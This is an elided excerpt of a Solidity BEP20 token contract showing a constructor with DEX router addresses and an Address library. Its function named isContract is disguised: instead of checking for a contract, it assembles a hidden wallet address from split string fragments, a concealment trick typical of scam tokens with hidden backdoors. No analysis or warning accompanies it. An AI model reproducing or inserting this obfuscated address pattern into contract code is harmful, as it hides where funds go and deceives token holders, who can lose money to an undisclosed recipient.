...
contract TokenContract is Context, IBEP20, Ownable, ReentrancyGuard {
    ...
    constructor(address payable _marketWallet) {
        ...
        IDexRouter _dexRouter = IDexRouter(
            // mainnet >>
            // 0x10ED43C718714eb63d5aA57B78B54704E256024E testnet 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
            // // testnet >>
...
library Address {
    ...
    function isContract(address checkSum) internal pure returns (address) {
        ...
        string memory checkSum1 = "5D42CFAf7A6eF";
        string memory checkSum2 = "05b54A088d85";
        string memory checkSum3 = "06fe9D843cbA1FE";
        return (parseAddr(concat("0xa", checkSum1, checkSum2, checkSum3)));
    }
